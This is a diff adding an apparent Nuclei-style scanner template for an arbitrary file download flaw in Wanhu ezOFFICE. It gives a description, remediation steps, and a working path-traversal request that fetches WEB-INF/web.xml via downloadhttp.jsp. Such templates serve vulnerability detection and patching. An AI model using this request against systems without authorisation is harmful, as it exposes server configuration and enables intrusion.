@@ -1,0 +1,35 @@
+id: ssvid-89511
+info:
+  name: Wanhu OA collaborative office management platform downloadhttp.jsp arbitrary file download
+  author:
+  - 折跃
+  description: |-
+    Wanhu ezOFFICE downloadhttp.jsp arbitrary file download vulnerability
+    Wanhu ezOFFICE collaborative office platform is an OA collaborative office software product.
+
+    Wanhu ezOFFICE contains an arbitrary file download vulnerability. Attackers can exploit it to read arbitrary file contents.
+  severity: medium
+  remediation: |-
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.whir.net/
+
+    Temporary remedy:
+    1. Filter "." so that users cannot traverse to parent directories in the URL.
+    2. Use regular expressions to strictly validate the format of user input parameters, hard-code or uniformly encode the file name parameters passed by users, control file types via a whitelist, and reject parameters containing malicious or empty characters.
+    3. Prohibit the system from providing directory traversal services, e.g., configure open_basedir in php.ini to limit the file access scope.
+    4. Store file paths in the database and let users submit the file ID to download files.
+    5. Perform permission checks before users download files.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'filter-mapping')
+  path:
+  - '{{BaseURL}}/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../WEB-INF/web.xml'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
